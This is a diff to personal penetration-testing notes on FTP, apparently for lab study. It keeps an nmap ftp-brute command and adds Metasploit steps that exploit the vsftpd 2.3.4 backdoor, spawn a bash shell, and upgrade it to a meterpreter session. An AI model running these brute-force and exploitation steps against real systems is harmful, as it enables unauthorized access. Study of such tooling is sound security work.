@@ -4,8 +4,9 @@
 	3. Usage
 	4. Related Services
 2. [Tools](#Tools)
-	1. hydra
-	2. nmap
+	1. [hydra](#hydra)
+	2. [nmap](#nmap)
+	3. [msfconsole](#msfconsole)
 
 ---
 
@@ -54,3 +55,20 @@ nmap 192.168.24.3 --script ftp-brute --script-args userdb=/root/users -p 21
 - --script
 	- ftp-brute
 		- `--sript-args userdb=/userlist.txt`
+
+---
+
+## msfconsole
+
+1. `search type:exploit vsftpd`
+2. `use exploit/unix/ftp/vsftpd_234_backdoor`
+	1. info
+	2. run : easy
+	3. `/bin/bash -i` : launch bash session
+	4. ctrl-z : to background the session
+3. `search shell_to_meterpreter` : look for module to upgrade session
+4. `use post/multi/manage/shell_to_meterpreter`
+	1. `set LHOST eht1` : set to ip of interface eth1
+	2. `set session 1` : set it to the session number for the shell connection
+	3. `run`
+5. `sessions` : to show and then connect by specifying number
